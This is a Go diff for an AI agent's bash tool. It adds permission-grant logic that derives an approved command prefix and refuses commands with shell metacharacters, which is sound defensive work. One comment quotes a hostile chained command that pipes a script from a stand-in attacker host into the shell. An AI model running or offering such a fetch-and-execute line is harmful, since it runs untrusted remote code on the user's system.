@@ -12,6 +12,8 @@ import (
 	"strings"
 	"time"
 	"unicode/utf8"
+
+	"github.com/K3N4Y/atenea/agentcore/permission"
 )
 
 // Limites y defaults de la tool bash. Timeout por tiers (no un numero del
@@ -47,6 +49,92 @@ func (*BashTool) Name() string { return "bash" }
 var bashDescription string
 
 func (*BashTool) Description() string { return bashDescription }
+
+// Effects: RunsCommands, and nothing more. That flag is already the widest one
+// there is — what a bash command really touches is whatever it runs — so naming
+// WritesFiles and ReachesNetwork beside it would add nothing a host can act on.
+func (*BashTool) Effects() Effects { return RunsCommands }
+
+// shellMetacharacters are the characters that let a command line run something
+// other than the command it appears to run: chaining, redirection, substitution
+// and escaping. A prefix says nothing about what those would execute, so a
+// command containing any of them is never grantable — `go test` granted once must
+// not wave through `go test ./... && curl evil.sh | sh`.
+const shellMetacharacters = ";&|<>$`\\()\n\r"
+
+// GrantRule reduces the call to the widest prefix the user can be said to have
+// authorized by approving it: the verb plus its subcommand when the second token
+// reads as one, the verb alone otherwise. Anything that is not a single simple
+// command is refused, so it keeps asking rather than granting a prefix that does
+// not describe what would run.
+//
+// The same derivation decides later whether an existing grant covers a new call,
+// which is why it must stay a pure function of the input.
+func (bt *BashTool) GrantRule(call Call) (permission.Rule, bool) {
+	prefix, ok := grantablePrefix(bashCommand(call.Input))
+	if !ok {
+		return permission.Rule{}, false
+	}
+	return permission.Rule{Tool: bt.Name(), Prefix: prefix}, true
+}
+
+// grantablePrefix derives the widest honest prefix of a bash command: the verb
+// plus its subcommand when the second token reads as one, the verb alone
+// otherwise. It refuses anything that is not a single simple command.
+func grantablePrefix(command string) (string, bool) {
+	if strings.ContainsAny(command, shellMetacharacters) {
+		return "", false
+	}
+	fields := strings.Fields(command)
+	if len(fields) == 0 {
+		return "", false
+	}
+	// A leading environment assignment (FOO=1 cmd) shifts the executable one
+	// token to the right, so the first field is not the verb: refuse rather than
+	// grant a prefix that names the wrong thing.
+	if strings.Contains(fields[0], "=") {
+		return "", false
+	}
+	prefix := fields[0]
+	if len(fields) > 1 && isSubcommand(fields[1]) {
+		prefix += " " + fields[1]
+	}
+	return prefix, true
+}
+
+// isSubcommand reports whether the token reads as a verb's subcommand (go test,
+// git status, npm run) rather than a flag, a path, a glob or a value: for those
+// the verb alone is the widest prefix the grant can claim.
+func isSubcommand(token string) bool {
+	if token == "" {
+		return false
+	}
+	for index, r := range token {
+		switch {
+		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z':
+		case index > 0 && (r >= '0' && r <= '9' || r == '-' || r == '_'):
+		default:
+			return false
+		}
+	}
+	return true
+}
+
+// bashCommand extracts the command from a bash tool input, tolerating the "cmd"
+// spelling the permission panel also accepts.
+func bashCommand(input []byte) string {
+	var in struct {
+		Command string `json:"command"`
+		Cmd     string `json:"cmd"`
+	}
+	if json.Unmarshal(input, &in) != nil {
+		return ""
+	}
+	if in.Command != "" {
+		return in.Command
+	}
+	return in.Cmd
+}
 
 func (*BashTool) Schema() json.RawMessage {
 	return json.RawMessage(`{"type":"object","properties":{"command":{"type":"string","description":"Comando de shell a ejecutar con bash -c."},"slow_ok":{"type":"boolean","description":"true para comandos potencialmente lentos (builds, instalaciones, tests): usa el timeout extendido."}},"required":["command"]}`)
